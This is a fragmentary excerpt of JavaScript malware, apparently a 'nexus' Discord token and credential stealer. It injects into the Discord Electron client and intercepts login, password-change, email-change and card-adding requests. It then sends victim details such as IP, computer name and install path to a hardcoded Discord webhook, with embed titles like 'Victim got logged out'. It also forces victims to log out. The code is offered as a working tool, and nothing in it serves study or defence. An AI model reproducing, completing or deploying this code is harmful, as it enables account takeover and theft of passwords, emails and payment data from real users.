...
var config = {
    ...
    webhook: "https://discord.com/api/webhooks/1135210272190111834/cb5BX3JztDsln2-gniMPFrUnuKit10VLATj5Bg63CPH_1gPRvnQG4s9r9RztVRFvJYcq",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: "https://discord.gg/nexustools"
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/nexus")) fs.rmdirSync(__dirname + "/nexus")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "nexus Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[nexus 2023 discord.gg/nexustools`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "nexused User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "nexus Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "nexus User Login",
                description: "**Oh you have logged someone**]",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "nexus Detect Password Changed",
                    description: "**Oh you have Logged someone**",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "nexus Detect Email Changed",
                    description: " **Oh you have Logged someone**",
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Nexus User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
